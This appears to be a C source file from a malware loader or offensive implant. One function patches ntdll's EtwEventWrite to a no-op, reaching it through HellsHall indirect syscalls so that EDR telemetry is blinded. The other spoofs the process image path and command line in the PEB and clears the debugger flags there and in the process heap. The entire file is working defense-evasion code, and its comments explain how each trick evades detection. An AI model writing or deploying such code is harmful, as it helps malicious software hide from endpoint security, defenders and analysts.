#include "Opsec.h"
#include "Common.h"
#include "Structs.h"
#include "ApiHashing.h"
#include "Syscalls.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* NtProtectVirtualMemory typedef — mirrors the one in Stub.cpp */
typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* Identifies which PatchEtw step failed; caller maps it to a distinct exit code. */
DWORD g_EtwFailStep = 0;

/* ============================================================
 *  Opsec_PatchEtw
 *
 *  Patches EtwEventWrite in the process ntdll to a 3-byte no-op:
 *    33 C0    xor eax, eax    (return STATUS_SUCCESS / 0)
 *    C3       ret
 *
 *  Why ETW matters:
 *    HellsHall indirect syscalls bypass user-mode API hooks placed by
 *    EDRs in ntdll stubs.  ETW is a completely separate telemetry channel:
 *    EtwEventWrite() sends events to kernel-registered providers
 *    (Microsoft-Windows-Kernel-Process, Threat-Intelligence, etc.) that EDRs
 *    subscribe to independently of any hook.  Patching it cuts off that
 *    channel for the lifetime of the process.
 *
 *  Implementation notes:
 *    - GetModuleHandleH(g_Hash_ntdll) resolves the process ntdll, which is
 *      the same image whose .text we want to patch.  Syscalls_Init() also
 *      reads from process ntdll for SSN derivation and trampoline lookup —
 *      both paths converge on the same module.
 *    - NtProtectVirtualMemory is called via HellsHall (indirect syscall +
 *      spoofed call stack) to avoid the EDR's hook on that function.
 *    - NtProtect may round the base address down to page boundary; a
 *      separate variable (pPage) is used so the original pEtw pointer
 *      remains intact for the byte write.
 *    - No RWX: page flips RX → RW (write only), then RW → RX (restore execute).
     *      The page never holds execute + write simultaneously.
 * ============================================================ */
BOOL Opsec_PatchEtw(void)
{
    g_EtwFailStep = 0;

    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (!hNtdll) { g_EtwFailStep = 1; return FALSE; }

    PBYTE pEtw = (PBYTE)GetProcAddressH(hNtdll, g_Hash_EtwEventWrite);
    if (!pEtw) { g_EtwFailStep = 2; return FALSE; }

    DWORD dwProtectSsn       = 0;
    PVOID pProtectTrampoline = NULL;
    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory,
                                  &dwProtectSsn, &pProtectTrampoline))
    { g_EtwFailStep = 3; return FALSE; }

    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;

    PVOID  pPage      = (PVOID)pEtw;
    SIZE_T regionSize = 8;
    ULONG  dwOldProtect = 0;

	SetSyscallParams(dwProtectSsn, pProtectTrampoline);
    NTSTATUS st = pNtProtect((HANDLE)-1, &pPage, &regionSize, PAGE_READWRITE, &dwOldProtect);
    if (!NT_SUCCESS(st)) { g_EtwFailStep = 4; return FALSE; }

    /* 5. Write patch: xor eax,eax (33 C0) + ret (C3)
     *    Overwrites the first 3 bytes of EtwEventWrite's prologue.
     *    On x64 the prologue begins with  mov r10,rcx (4D 8B D1)  which is
     *    4 bytes; our 3-byte patch replaces it entirely before any real work
     *    is done.  RAX = 0 = STATUS_SUCCESS: callers see a clean return. */
    pEtw[0] = 0x33;   /* xor eax, eax */
    pEtw[1] = 0xC0;
    pEtw[2] = 0xC3;   /* ret          */

    /* 6. Flip page back: RW → RX (close write window, restore execute bit) */
    pPage      = (PVOID)pEtw;
    regionSize = 8;
	SetSyscallParams(dwProtectSsn, pProtectTrampoline);
    pNtProtect((HANDLE)-1, &pPage, &regionSize, PAGE_EXECUTE_READ, &dwOldProtect);

    return TRUE;
}

/* ============================================================
 *  Opsec_SpoofPeb
 *
 *  Modifies PEB->ProcessParameters->ImagePathName so that
 *  tools like Process Hacker show a fake path instead of the
 *  actual one.
 * ============================================================ */
void Opsec_SpoofPeb(const wchar_t* fakePath) {
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (!pPeb || !pPeb->ProcessParameters)
        return;

    PRTL_USER_PROCESS_PARAMETERS pParams = pPeb->ProcessParameters;

    SIZE_T pathLen = custom_wcslen(fakePath);
    USHORT byteLen = (USHORT)(pathLen * sizeof(wchar_t));

    if (pParams->ImagePathName.MaximumLength >= byteLen + sizeof(wchar_t)) {
        custom_memset(pParams->ImagePathName.Buffer, 0, pParams->ImagePathName.MaximumLength);
        custom_memcpy(pParams->ImagePathName.Buffer, fakePath, byteLen);
        pParams->ImagePathName.Length = byteLen;
    }

    if (pParams->CommandLine.MaximumLength >= byteLen + sizeof(wchar_t)) {
        custom_memset(pParams->CommandLine.Buffer, 0, pParams->CommandLine.MaximumLength);
        custom_memcpy(pParams->CommandLine.Buffer, fakePath, byteLen);
        pParams->CommandLine.Length = byteLen;
    }

    /* --------------------------------------------------------
     *  Anti-debug: clear PEB fields checked by debuggers/tools
     * -------------------------------------------------------- */

    // 5a. BeingDebugged — read by IsDebuggerPresent() and most AV sandboxes
    pPeb->BeingDebugged = 0;

    // 5b. NtGlobalFlag — set to 0x70 by Windows when a debugger is attached
    //     (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
    //     x64 PEB layout: +0x068=ApiSetMap, +0x0B8=NumberOfProcessors, +0x0BC=NtGlobalFlag
    //     x86 PEB layout: +0x068=NtGlobalFlag
#if defined(_M_X64)
    *(PULONG)((PBYTE)pPeb + 0xBC) = 0;
#else
    *(PULONG)((PBYTE)pPeb + 0x68) = 0;
#endif

    // 5c. ProcessHeap flags — heap instrumentation leaves Flags != 2 and ForceFlags != 0
    //     In Structs.h layout: Reserved4[0]=SubSystemData (+0x028), Reserved4[1]=ProcessHeap (+0x030)
    PVOID pHeap = pPeb->Reserved4[1];
    if (pHeap) {
#if defined(_M_X64)
        *(PULONG)((PBYTE)pHeap + 0x70) = 2;   // Flags: HEAP_GROWABLE only (normal process)
        *(PULONG)((PBYTE)pHeap + 0x74) = 0;   // ForceFlags: none
#else
        *(PULONG)((PBYTE)pHeap + 0x40) = 2;   // Flags x86
        *(PULONG)((PBYTE)pHeap + 0x44) = 0;   // ForceFlags x86
#endif
    }
}
